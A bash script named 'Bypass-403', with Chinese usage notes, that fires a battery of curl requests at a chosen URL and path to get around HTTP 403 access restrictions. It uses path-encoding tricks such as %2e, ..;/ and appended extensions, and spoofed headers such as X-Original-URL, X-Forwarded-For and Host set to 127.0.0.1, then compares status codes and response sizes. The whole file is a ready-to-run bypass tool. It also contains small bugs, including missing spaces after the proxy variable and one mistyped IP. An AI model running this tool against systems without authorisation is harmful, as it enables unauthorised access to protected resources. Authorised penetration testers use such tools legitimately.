#! /bin/bash
figlet Bypass-403

DETAIL=0
if [[ "$3" == "-d" ]]; then
    DETAIL=1
    echo "[+] Detailed mode enabled (html2text)"
fi

if [[ "$3" == "-p" ]]; then
    PROXY="--proxy http://127.0.0.1:8080"
else
    PROXY=""
fi

echo 
echo " 觀察有什麼不同"
echo "./bypass-403.sh https://example.com path "
echo "./bypass-403.sh  http://192.168.132.134:13337 logs  "
echo " 如果要查看詳情的話，請加上-p 最尾 然後開啟burpsuite 聆聽"
echo "./bypass-403.sh https://example.com path -p "
echo "./bypass-403.sh  http://192.168.132.134:13337 logs -p"
echo " "
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2 
echo "  --> ${1}/${2}"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2  
echo "  --> ${1}/%2e/${2}"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1   
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl $PROXY-k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl $PROXY -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl $PROXY -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl $PROXY -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
#updated
curl $PROXY  -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
curl $PROXY-s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host:127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"

# Additional Host-based bypass headers
curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Host:127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Host: 127.0.0.1"

curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 27.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"

curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For:localhost" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: localhost"

curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Server:127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Server: 127.0.0.1"

curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"

curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Host-Override: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-HTTP-Host-Override: 127.0.0.1"

curl $PROXY -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" \
     -H "Forwarded: for=127.0.0.1;host=127.0.0.1;proto=http" $1/$2
echo "  --> ${1}/${2} -H Forwarded: for=127.0.0.1;host=127.0.0.1;proto=http"


echo "Way back machine:"
curl $PROXY -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'

